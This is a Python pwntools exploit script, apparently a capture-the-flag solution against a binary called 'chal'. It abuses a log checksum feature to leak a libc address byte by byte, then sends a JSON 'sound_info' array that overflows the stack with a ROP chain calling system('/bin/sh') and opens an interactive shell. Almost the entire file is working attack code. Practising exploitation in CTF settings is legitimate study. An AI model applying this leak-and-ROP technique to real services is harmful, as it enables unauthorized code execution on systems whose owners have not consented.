#!/usr/bin/python3

from pwn import *
import json
import itertools

context.binary = exe = ELF("chal")
libc = ELF("./libc.so.6")
context.log_level = "debug"
def GDB():
    gdb.attach(p,gdbscript='''
    b* write_log + +278
    # b* info
    # b* main + 75
    c
    ''')
    input()

# struct header {
#     int code ;
#     uint32_t sound_info_size ;
#     uint32_t video_info_size;
# };

def heart_beat():
    payload = p32(0)
    payload += p32(0)
    payload += p32(0)
    p.send(payload)
    
def info(payload):
    header = p32(1)
    header += p32(0)
    header += p32(199)
    p.send(header)
    print(payload)
    p.send(payload)


def Write_log(content_len,content):
    header = p32(2)
    header += p64(0)
    p.send(header)
    sleep(0.2)

    log_header = p32(0xDEADBEEF)
    log_header += p32(content_len)
    log_header += p32(0)
    p.send(log_header)
    sleep(0.2)

    p.send(content)

# p = remote("0.0.0.0",1337)
p = process(exe.path)

Write_log(0x48,b"\x00"*0x48) # clear the stack
p.recvuntil(b"CHECKSUM ON LOG CONTENT : ")

Write_log(37,b"\x00"*37)
p.recvuntil(b"CHECKSUM ON LOG CONTENT : ")
leak0 = int(p.recvline()[:-1])

Write_log(38,b"\x00"*38)
p.recvuntil(b"CHECKSUM ON LOG CONTENT : ")
leak1 = int(p.recvline()[:-1]) - leak0

Write_log(39,b"\x00"*39)
p.recvuntil(b"CHECKSUM ON LOG CONTENT : ")
leak2 = int(p.recvline()[:-1]) - leak1 - leak0

libc.address = leak0 + (leak1<<16) + (leak2 << 32) - 0x11a8f4
print(hex(libc.address))
input()
RDI = libc.address + 0x000000000002a3e5
RDX_R12 = libc.address + 0x000000000011f2e7
RSI = libc.address + 0x000000000002be51
ropper = [i for i in range(0x65)] + [ "canary",0] + [ RDI,next(libc.search(b"/bin/sh\x00")),RSI,0,RDX_R12,0,0,libc.sym['system']]
pl = {"sound_info" : ropper}
pl_json = json.dumps(pl)
info(pl_json.encode())

p.interactive()